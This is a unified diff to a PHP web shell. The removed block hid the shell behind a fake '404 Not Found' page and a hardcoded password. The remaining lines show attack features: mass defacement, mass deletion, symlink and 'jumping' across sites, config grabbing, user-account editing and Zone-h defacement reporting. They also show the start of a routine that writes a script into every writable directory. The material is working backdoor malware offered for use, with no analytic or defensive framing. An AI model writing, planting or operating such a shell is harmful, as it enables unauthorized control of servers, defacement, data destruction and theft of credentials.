@@ -1,59 +1,3 @@
-<?php 
-// Priv Shell 
-// Silence Because Yourself
-
-error_reporting(0);
-header('HTTP/1.0 404 Not Found', true, 404);
-session_start();
-$pass = "admin";
-$link = "fvck.txt";
-if($_POST['password'] == $pass) {
-  $_SESSION['forbidden'] = $pass;
-  echo "<script>window.location='?zet'</script>";
-}
-if($_GET['page'] == "blank") {
-  echo "<a href='?'>Back</a>";
-  exit();
-}
-if(isset($_REQUEST['logout'])) {
-  session_destroy();
-  echo "<script>window.location='?zet'</script>";
-}
-if(!($_SESSION['forbidden'])) {
-?>
-<title>404 Not Found</title>
-<meta name="theme color" content="black"> </meta>
-<link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css?family=Oxanium&display=swap" rel="stylesheet">
-
-<html>
-<head>
-	<title>Tak Terlihat Shell</title>
-<meta charset="UTF-8"> <meta name="Author" content="Zildan-Sec" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Cowok Tersakiti Team" />
-</head>
-<style>
-	input { margin:0;background-color:#fff;border:1px solid #fff; }
-</style>
-<body bgcolor="white">
-<h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
-<p>Additionally, a 404 Not Found
-error was encountered while trying to use an ErrorDocument to handle the request.</p>
-
-	<form method="post">
-		<input type="password" name="password" placeholder="">
-		<br>
-		<br>
-		<?php echo $_SESSIOM['forbidden']; ?>
-	    </form>
-	  </td>
-	 </table>
-
-<?php 
-
-exit();
-}
- ?>
 <?php
 error_reporting(0);
 set_time_limit(0);
@@ -237,7 +181,7 @@ echo "<a class='destroy_table' href='?logout=true'>Logout</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=zoneh'>Zone-h</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=jumping'>Jumping</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=sym'>Symlink</a>";
-echo "<a class='destroy_table' href='?dir=$dir&to=asokoe'>Mass_deface</a>";
+echo "<a class='destroy_table' href='?dir=$dir&to=mass'>Mass_deface</a>";
 echo "<a class='destroy_table' href='?dir=$dir&to=masse'>Mass_delete</a><br>";
 echo "<a class='destroy_table' href='?dir=$dir&to=config'>Config_grab</a>";
 echo "<a class='destroy_table' href='?dir=$dir&do=auto_edit_user'>auto_edit_user</a>";
@@ -300,7 +244,7 @@ if($_GET['to'] == 'zoneh') {
 		</form>";
 	}
 	echo "</center>";
-} elseif($_GET['to'] == 'asokoe') {
+} elseif($_GET['to'] == 'mass') {
 	function sabun_massal($dir,$namafile,$isi_script) {
 		if(is_writable($dir)) {
 			$dira = scandir($dir);
